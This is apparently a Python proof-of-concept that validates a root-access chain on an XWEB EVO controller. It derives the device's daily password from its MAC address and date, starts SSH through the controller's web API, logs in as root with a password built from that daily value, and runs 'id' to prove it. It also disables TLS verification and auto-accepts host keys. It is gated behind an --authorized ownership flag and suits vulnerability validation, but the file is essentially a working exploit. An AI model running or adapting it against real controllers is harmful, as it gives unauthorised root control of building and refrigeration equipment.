#!/usr/bin/env python3
import argparse
import datetime
import json
import re
import ssl
import time
from pathlib import Path
from urllib.parse import urlencode, urlsplit
from urllib.request import urlopen
from zoneinfo import ZoneInfo, ZoneInfoNotFoundError

import paramiko

from xweb_evo_password import password


def request_json(url, values=None, timeout=5):
    data = None if values is None else urlencode(values).encode()
    with urlopen(url, data=data, timeout=timeout, context=ssl._create_unverified_context()) as response:
        text = response.read().decode("utf-8", errors="strict").strip()
    start = text.find("{")
    end = text.rfind("}")
    if start < 0 or end < start:
        raise ValueError(f"Non-JSON response from {url}: {text[:120]}")
    return json.loads(text[start : end + 1])


def controller_time(info):
    timestamp = info.get("timestamp")
    if timestamp is None:
        return datetime.datetime.now()
    timezone = info.get("timezone")
    if timezone:
        try:
            return datetime.datetime.fromtimestamp(int(timestamp), ZoneInfo(timezone))
        except (ValueError, ZoneInfoNotFoundError):
            pass
    return datetime.datetime.fromtimestamp(int(timestamp))


def api_ssh(base, daily, target, timeout):
    return request_json(
        base + "/cgi-bin/api.lua",
        {"action": "ssh", "password": daily, "target": target},
        timeout,
    )


def main():
    parser = argparse.ArgumentParser(
        description="Validate the EVO daily-password SSH chain on an explicitly owned controller."
    )
    parser.add_argument("target", help="Controller base URL, for example https://192.0.2.10")
    parser.add_argument("--authorized", action="store_true", help="Confirm ownership and permission to start SSH")
    parser.add_argument("--ssh-port", type=int, default=22)
    parser.add_argument("--timeout", type=float, default=5)
    parser.add_argument("--keep-ssh", action="store_true", help="Leave SSH running after validation")
    parser.add_argument("--json", type=Path, help="Optional sanitized result log; no credentials are recorded")
    args = parser.parse_args()
    if not args.authorized:
        parser.error("--authorized is required; use only on a device you own and may modify")
    base = args.target.rstrip("/")
    if not re.match(r"^https?://[^/]+$", base):
        parser.error("target must be an HTTP(S) base URL without a path")

    started = False
    result = {"target": base, "validated": False, "ssh_stopped": False}
    try:
        system = request_json(base + "/cgi-bin/sysinfo.lua", timeout=args.timeout)
        info = system.get("info", system)
        mac = re.sub(r"[^0-9A-Fa-f]", "", str(info["id"])).upper()
        if len(mac) != 12:
            raise ValueError("sysinfo did not return a valid MAC address")
        now = controller_time(info)
        daily = password(now.day, now.month, now.year % 100, mac)
        result.update({"release": info.get("release"), "date": now.date().isoformat()})

        response = api_ssh(base, daily, "start", args.timeout)
        if response.get("status") != "ok":
            raise RuntimeError(f"SSH start rejected: {response}")
        started = True
        result["ssh_start"] = response

        root_password = "xwebdix" + daily
        last_error = None
        for _ in range(6):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(
                    urlsplit(base).hostname,
                    port=args.ssh_port,
                    username="root",
                    password=root_password,
                    timeout=args.timeout,
                    banner_timeout=args.timeout,
                    auth_timeout=args.timeout,
                    look_for_keys=False,
                    allow_agent=False,
                )
                _, stdout, stderr = client.exec_command(
                    "printf 'EVO_ROOT_PROOF\\n'; id; cat /etc/xwebversion.json",
                    timeout=args.timeout,
                )
                result["proof"] = stdout.read().decode("utf-8", errors="replace").strip()
                errors = stderr.read().decode("utf-8", errors="replace").strip()
                if errors:
                    result["stderr"] = errors
                result["validated"] = "EVO_ROOT_PROOF" in result["proof"] and "uid=0" in result["proof"]
                client.close()
                break
            except (OSError, paramiko.SSHException) as error:
                client.close()
                last_error = error
                time.sleep(2)
        if not result["validated"]:
            raise RuntimeError(f"SSH root validation failed: {last_error}")
    finally:
        if started and not args.keep_ssh:
            try:
                response = api_ssh(base, daily, "stop", args.timeout)
                result["ssh_stopped"] = response.get("status") == "ok"
                result["ssh_stop"] = response
            except Exception as error:
                result["ssh_stop_error"] = str(error)
    print(json.dumps(result, indent=2))
    if args.json:
        args.json.parent.mkdir(parents=True, exist_ok=True)
        args.json.write_text(json.dumps(result, indent=2) + "\n")


if __name__ == "__main__":
    main()
